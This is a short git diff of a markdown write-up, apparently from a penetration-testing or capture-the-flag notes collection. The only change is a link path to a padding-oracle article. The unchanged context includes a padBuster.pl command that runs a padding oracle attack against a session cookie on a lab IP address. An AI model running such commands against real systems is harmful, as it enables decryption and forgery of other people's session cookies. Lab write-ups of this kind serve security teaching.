@@ -20,7 +20,7 @@ And if you change some **byte** of the **cookie** you get this error:
 
 ![](../../.gitbook/assets/image%20%28109%29.png)
 
-With this information and[ **reading the padding oracle vulnerability**](../../crypto/padding-oracle-priv.md) I was able to exploit it:
+With this information and[ **reading the padding oracle vulnerability**](../../cryptography/padding-oracle-priv.md) I was able to exploit it:
 
 ```bash
 perl ./padBuster.pl http://10.10.231.5/index.php "GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" 8 -encoding 0 -cookies "hcon=GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy"
